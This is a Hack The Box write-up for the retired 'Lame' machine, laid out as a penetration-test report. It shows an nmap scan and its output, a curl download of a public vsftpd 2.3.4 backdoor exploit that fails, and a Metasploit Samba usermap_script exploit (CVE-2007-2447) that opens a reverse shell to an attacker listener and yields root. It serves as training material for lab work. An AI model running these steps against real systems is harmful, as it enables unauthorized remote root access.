
# Hack The Box: Lame (Retired Machine)

![](attachments/Pasted%20image%2020251016184744.png)
- [1. Executive Summary](#1-executive-summary)
- [2. Scanning & Enumeration](#2-scanning--enumeration)
	- [2.1 Port Scan](#21-port-scan)
		- [2.1.1 Output](#211-output)
- [3. Vulnerability Analysis](#3-vulnerability-analysis)
	- [3.1 Remote Shell Access with CVE-2011-2523](#31-remote-shell-access-with-cve-2011-2523)
		- [3.1.1 Fetch and Execute Script](#311-fetch-and-execute-script)
		- [3.1.2 Output](#312-output)
	- [3.2 Remote Command Execution with CVE-2007-2447](#32-remote-command-execution-with-cve-2007-2447)
		- [3.2.1 Launch and Configure Exploit](#321-launch-and-configure-exploit)
		- [3.2.2 Execute Exploit](#322-execute-exploit)
		- [3.2.3 Output](#323-output)
## 1. Executive Summary

This report outlines the penetration test conducted on the target host `lame.htb` under the HackTheBox environment. 

The goal was to identify vulnerabilities and provide recommendations for securing the system.

## 2. Scanning & Enumeration

### 2.1 Port Scan

The following Nmap command was executed:

```bash
nmap -Pn -sC -sV -oN lame.nmap -vv lame.htb
```

#### 2.1.1 Output

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-16 15:07 UTC
Nmap scan report for 10.129.33.67
Host is up (0.086s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.48
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m36s, deviation: 2h49m46s, median: 33s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-10-16T11:08:51-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Nmap done: 1 IP address (1 host up) scanned in 61.22 seconds
```

## 3. Vulnerability Analysis

### 3.1 Remote Shell Access with CVE-2011-2523

> vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp.
> 
> Source: https://www.cvedetails.com/cve/CVE-2011-2523

#### 3.1.1 Fetch and Execute Script

```bash
curl https://www.exploit-db.com/download/49757 -o CVE-2011-2523.py
```

```bash
python3 CVE-2011-2523.py lame.htb
```

#### 3.1.2 Output

```bash
# The command did not execute successfully, indicating potential issues that require further investigation.
```

### 3.2 Remote Command Execution with CVE-2007-2447

> The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.
>
>Source: https://www.cvedetails.com/cve/CVE-2007-2447


#### 3.2.1 Launch and Configure Exploit

```bash
msfconsole

use exploit/multi/samba/usermap_script
set RHOST lame.htb
set LHOST 10.10.14.48
```

#### 3.2.2 Execute Exploit

```bash
exploit
```

#### 3.2.3 Output 

```bash
[*] Started reverse TCP handler on 10.10.14.48:4444 
[*] Command shell session 1 opened (10.10.14.48:4444 -> 10.129.34.7:54082) at 2025-10-16 15:02:33 +0000

whoami
root
```